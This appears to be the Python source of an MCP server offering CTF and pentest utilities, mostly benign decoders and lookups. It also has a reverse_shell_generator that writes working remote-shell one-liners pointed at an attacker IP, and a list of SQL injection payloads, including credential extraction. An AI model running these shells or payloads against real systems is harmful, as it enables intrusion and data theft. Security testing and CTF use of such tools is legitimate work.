"""Security Toolkit MCP Server

提供安全 / CTF 常用工具的 MCP 服务器：
hash 识别、多格式解码、XOR 爆破、频率分析、JWT 解码、
反弹 shell 生成、SQL 注入 payload、CVE 查询、端口服务查询。

同时兼容 mcp 1.x (FastMCP) 与 mcp 2.x (MCPServer) 两代 SDK。
"""

# --- MCP SDK 兼容导入 ------------------------------------------------------
# mcp 2.x 将 FastMCP 更名为 MCPServer（导入路径 mcp.server.mcpserver）；
# mcp 1.x 仍为 mcp.server.fastmcp.FastMCP。优先加载 2.x，失败时回退 1.x。
try:
    from mcp.server.mcpserver import MCPServer as FastMCP  # mcp 2.x
except ImportError:
    from mcp.server.fastmcp import FastMCP  # mcp 1.x

import base64
import json
import string
from urllib.parse import unquote

import requests

# Initialize MCP server (name shown to MCP clients)
mcp = FastMCP("security-toolkit")


def _strip_spaces(text: str) -> str:
    """清洗输入：去除字符串中的所有空白字符（空格、换行、制表符）。"""
    return "".join(text.split())


def _pad_base64(segment: str) -> str:
    """按 base64 规则补齐缺失的 '=' padding，使段长度成为 4 的倍数。"""
    return segment + "=" * (-len(segment) % 4)


@mcp.tool()
def hash_identifier(hash_string: str) -> str:
    """Identify hash type based on length and format

    Args:
        hash_string: The hash to identify
    """
    # 依据长度与字符集判断可能的 hash 类型（一个 hash 可能命中多条）
    hash_len = len(hash_string)
    hash_lower = hash_string.lower()

    identifications = []

    # MD5
    if hash_len == 32 and all(c in '0123456789abcdef' for c in hash_lower):
        identifications.append("MD5")

    # SHA-1
    if hash_len == 40 and all(c in '0123456789abcdef' for c in hash_lower):
        identifications.append("SHA-1")

    # SHA-256
    if hash_len == 64 and all(c in '0123456789abcdef' for c in hash_lower):
        identifications.append("SHA-256")

    # SHA-512
    if hash_len == 128 and all(c in '0123456789abcdef' for c in hash_lower):
        identifications.append("SHA-512")

    # bcrypt
    if hash_string.startswith('$2a$') or hash_string.startswith('$2b$') or hash_string.startswith('$2y$'):
        identifications.append("bcrypt")

    # NTLM（与 MD5 同为 32 位十六进制，无法仅凭格式区分，故标记 possible）
    if hash_len == 32 and all(c in '0123456789abcdef' for c in hash_lower):
        identifications.append("NTLM (possible)")

    if not identifications:
        identifications.append("Unknown hash type")

    result = {
        "hash": hash_string,
        "length": hash_len,
        "possible_types": identifications
    }

    return json.dumps(result, indent=2)


@mcp.tool()
def decode_string(encoded_string: str, encoding_type: str = "auto") -> str:
    """Decode strings with various encodings (base64, hex, url, rot13, binary)

    Args:
        encoded_string: The string to decode
        encoding_type: Type of encoding (auto, base64, hex, url, rot13, binary)
    """
    # 校验 encoding_type，未知类型直接提示（与其他工具的报错风格保持一致）
    valid_types = ("auto", "base64", "hex", "url", "rot13", "binary")
    if encoding_type not in valid_types:
        return f"Unknown encoding type. Available: {', '.join(valid_types)}"

    results = {}

    if encoding_type == "auto" or encoding_type == "base64":
        try:
            # 严格模式（validate=True）拒绝非法字符，避免把任意字符串误判为 base64
            candidate = _pad_base64(_strip_spaces(encoded_string))
            decoded = base64.b64decode(candidate, validate=True).decode('utf-8')
            results["base64"] = decoded
        except Exception:
            results["base64"] = "Failed to decode"

    if encoding_type == "auto" or encoding_type == "hex":
        try:
            cleaned = _strip_spaces(encoded_string).replace('0x', '')
            decoded = bytes.fromhex(cleaned).decode('utf-8', errors='ignore')
            results["hex"] = decoded
        except Exception:
            results["hex"] = "Failed to decode"

    if encoding_type == "auto" or encoding_type == "url":
        try:
            decoded = unquote(encoded_string)
            results["url"] = decoded
        except Exception:
            results["url"] = "Failed to decode"

    if encoding_type == "auto" or encoding_type == "rot13":
        try:
            decoded = encoded_string.translate(str.maketrans(
                'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz',
                'NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm'
            ))
            results["rot13"] = decoded
        except Exception:
            results["rot13"] = "Failed to decode"

    if encoding_type == "auto" or encoding_type == "binary":
        try:
            # Handle binary strings like "01001000 01100101"
            binary_str = encoded_string.replace(' ', '')
            if binary_str and all(c in '01' for c in binary_str):
                decoded = ''.join(chr(int(binary_str[i:i+8], 2)) for i in range(0, len(binary_str), 8))
                results["binary"] = decoded
            else:
                results["binary"] = "Failed to decode (not a binary string)"
        except Exception:
            results["binary"] = "Failed to decode"

    return json.dumps(results, indent=2)


@mcp.tool()
def xor_bruteforce(hex_string: str, max_key_length: int = 4) -> str:
    """Bruteforce XOR cipher with single-byte or multi-byte keys

    Args:
        hex_string: Hex-encoded ciphertext
        max_key_length: Maximum key length to try (default: 4)
    """
    # 将十六进制密文解析为字节串（去除空白与 0x 前缀）
    try:
        ciphertext = bytes.fromhex(_strip_spaces(hex_string).replace('0x', ''))
    except ValueError:
        return "Invalid hex string"

    # 空密文直接拒绝，避免输出 256 条无意义的空结果
    if not ciphertext:
        return "Empty ciphertext"

    results = []

    # 单字节 XOR：穷举 0x00-0xFF，保留可完全解码为可打印文本的结果
    for key in range(256):
        plaintext = bytes([b ^ key for b in ciphertext])
        try:
            decoded = plaintext.decode('utf-8', errors='strict')
            # Check if result looks like readable text
            if all(c in string.printable for c in decoded):
                results.append({
                    "key": hex(key),
                    "key_decimal": key,
                    "plaintext": decoded,
                    "type": "single-byte"
                })
        except UnicodeDecodeError:
            continue

    # 多字节 XOR（简化版：仅尝试单字节重复构成的密钥，如 b'\xAA\xAA\xAA'）
    if max_key_length > 1 and len(results) == 0:
        for key_len in range(2, min(max_key_length + 1, 5)):
            for key_val in range(256):
                key = bytes([key_val] * key_len)
                plaintext = bytes([ciphertext[i] ^ key[i % key_len] for i in range(len(ciphertext))])
                try:
                    decoded = plaintext.decode('utf-8', errors='strict')
                    if all(c in string.printable for c in decoded):
                        results.append({
                            "key": key.hex(),
                            "key_length": key_len,
                            "plaintext": decoded,
                            "type": "multi-byte"
                        })
                except UnicodeDecodeError:
                    continue

    if not results:
        return "No readable plaintext found with XOR bruteforce"

    # Return top 10 results
    return json.dumps({"results": results[:10], "total_found": len(results)}, indent=2)


@mcp.tool()
def frequency_analysis(ciphertext: str) -> str:
    """Perform frequency analysis on ciphertext (useful for substitution ciphers)

    Args:
        ciphertext: The ciphertext to analyze
    """
    # 统计字母出现次数
    freq = {}
    total_letters = 0

    for char in ciphertext.upper():
        if char.isalpha():
            freq[char] = freq.get(char, 0) + 1
            total_letters += 1

    # 按频率降序排序
    sorted_freq = sorted(freq.items(), key=lambda x: x[1], reverse=True)

    # 常见英文字母频率顺序（用于对比替换密码）
    english_freq = "ETAOINSHRDLCUMWFGYPBVKJXQZ"

    result = {
        "total_letters": total_letters,
        "unique_letters": len(freq),
        "frequency_order": ''.join([item[0] for item in sorted_freq]),
        "english_frequency": english_freq,
        "detailed_frequencies": [
            {"letter": letter, "count": count, "percentage": round((count/total_letters)*100, 2)}
            for letter, count in sorted_freq
        ]
    }

    return json.dumps(result, indent=2)


@mcp.tool()
def jwt_decode(token: str) -> str:
    """Decode JWT token and display header, payload, and signature

    Args:
        token: JWT token string
    """
    try:
        parts = token.strip().split('.')
        if len(parts) != 3:
            return "Invalid JWT format (expected 3 parts separated by dots)"

        # 分段解码 base64url（按需补齐 padding，而非固定补 '=='）
        header_raw = base64.urlsafe_b64decode(_pad_base64(parts[0]))
        payload_raw = base64.urlsafe_b64decode(_pad_base64(parts[1]))
        header = json.loads(header_raw.decode('utf-8'))
        payload = json.loads(payload_raw.decode('utf-8'))
        signature = parts[2]

        result = {
            "header": header,
            "payload": payload,
            "signature": signature,
            "algorithm": header.get('alg', 'Unknown'),
            "warning": "Verify signature before trusting this token"
        }

        return json.dumps(result, indent=2)
    except Exception as e:
        return f"Error decoding JWT: {str(e)}"


@mcp.tool()
def reverse_shell_generator(ip: str, port: int, shell_type: str = "bash") -> str:
    """Generate reverse shell commands for various languages/shells

    Args:
        ip: Attacker IP address
        port: Listening port
        shell_type: Type of shell (bash, python, nc, php, perl, ruby)
    """
    # 常见反弹 shell payload（参考 pentestmonkey 速查表）
    shells = {
        "bash": f"bash -i >& /dev/tcp/{ip}/{port} 0>&1",
        "python": f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
        "nc": f"nc -e /bin/sh {ip} {port}",
        "php": f"php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        "perl": f"perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
        "ruby": f"ruby -rsocket -e'f=TCPSocket.open(\"{ip}\",{port}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
    }

    if shell_type == "all":
        result = {
            "listener_command": f"nc -lvnp {port}",
            "shells": shells
        }
    elif shell_type in shells:
        result = {
            "listener_command": f"nc -lvnp {port}",
            "shell_type": shell_type,
            "command": shells[shell_type]
        }
    else:
        return f"Unknown shell type. Available: {', '.join(shells.keys())}, all"

    return json.dumps(result, indent=2)


@mcp.tool()
def sqli_payloads(injection_type: str = "basic") -> str:
    """Get SQL injection payloads for testing

    Args:
        injection_type: Type of SQLi (basic, union, blind, error, time)
    """
    # 按注入类型分组的常用测试 payload
    payloads = {
        "basic": [
            "' OR '1'='1",
            "' OR 1=1--",
            "admin' --",
            "' OR '1'='1' /*",
            "') OR ('1'='1"
        ],
        "union": [
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION SELECT username,password FROM users--",
            "' UNION ALL SELECT NULL,NULL,NULL--"
        ],
        "blind": [
            "' AND 1=1--",
            "' AND 1=2--",
            "' AND SUBSTRING(@@version,1,1)='5'--",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"
        ],
        "error": [
            "' AND 1=CONVERT(int,(SELECT @@version))--",
            "' AND extractvalue(1,concat(0x7e,database()))--",
            "' AND updatexml(1,concat(0x7e,database()),1)--"
        ],
        "time": [
            "' AND SLEEP(5)--",
            "'; WAITFOR DELAY '00:00:05'--",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "' AND BENCHMARK(5000000,MD5('test'))--"
        ]
    }

    if injection_type == "all":
        result = {"payloads": payloads}
    elif injection_type in payloads:
        result = {
            "type": injection_type,
            "payloads": payloads[injection_type]
        }
    else:
        return f"Unknown injection type. Available: {', '.join(payloads.keys())}, all"

    return json.dumps(result, indent=2)


@mcp.tool()
def cve_lookup(cve_id: str) -> str:
    """Look up CVE details from the National Vulnerability Database

    Args:
        cve_id: CVE identifier (e.g., CVE-2024-1234)
    """
    # 调用 NVD 2.0 API 查询指定 CVE（注意接口有速率限制）
    try:
        response = requests.get(
            "https://services.nvd.nist.gov/rest/json/cves/2.0",
            params={"cveId": cve_id},
            timeout=10
        )

        if response.status_code == 200:
            data = response.json()

            if data.get("vulnerabilities"):
                vuln = data["vulnerabilities"][0]["cve"]

                result = {
                    "id": vuln["id"],
                    "published": vuln.get("published", "N/A"),
                    "lastModified": vuln.get("lastModified", "N/A"),
                    "description": vuln["descriptions"][0]["value"] if vuln.get("descriptions") else "No description",
                    "references": [ref["url"] for ref in vuln.get("references", [])[:5]]
                }

                return json.dumps(result, indent=2)
            else:
                return f"CVE {cve_id} not found"
        else:
            return f"Error: HTTP {response.status_code}"

    except Exception as e:
        return f"Error: {str(e)}"


@mcp.tool()
def port_service_lookup(port: int) -> str:
    """Look up common services running on a given port number

    Args:
        port: Port number to look up
    """
    # 常见端口与服务映射表
    common_ports = {
        21: {"service": "FTP", "description": "File Transfer Protocol"},
        22: {"service": "SSH", "description": "Secure Shell"},
        23: {"service": "Telnet", "description": "Unencrypted text communications"},
        25: {"service": "SMTP", "description": "Simple Mail Transfer Protocol"},
        53: {"service": "DNS", "description": "Domain Name System"},
        80: {"service": "HTTP", "description": "Hypertext Transfer Protocol"},
        110: {"service": "POP3", "description": "Post Office Protocol v3"},
        143: {"service": "IMAP", "description": "Internet Message Access Protocol"},
        443: {"service": "HTTPS", "description": "HTTP Secure"},
        445: {"service": "SMB", "description": "Server Message Block"},
        3306: {"service": "MySQL", "description": "MySQL Database"},
        3389: {"service": "RDP", "description": "Remote Desktop Protocol"},
        5432: {"service": "PostgreSQL", "description": "PostgreSQL Database"},
        5900: {"service": "VNC", "description": "Virtual Network Computing"},
        6379: {"service": "Redis", "description": "Redis Database"},
        8080: {"service": "HTTP-ALT", "description": "Alternative HTTP port"},
        27017: {"service": "MongoDB", "description": "MongoDB Database"},
    }

    if port in common_ports:
        result = {
            "port": port,
            "service": common_ports[port]["service"],
            "description": common_ports[port]["description"]
        }
    else:
        result = {
            "port": port,
            "service": "Unknown",
            "description": "No common service found for this port"
        }

    return json.dumps(result, indent=2)


if __name__ == "__main__":
    # 以 stdio 传输启动 MCP 服务器（MCP 客户端的标准启动方式）
    mcp.run()
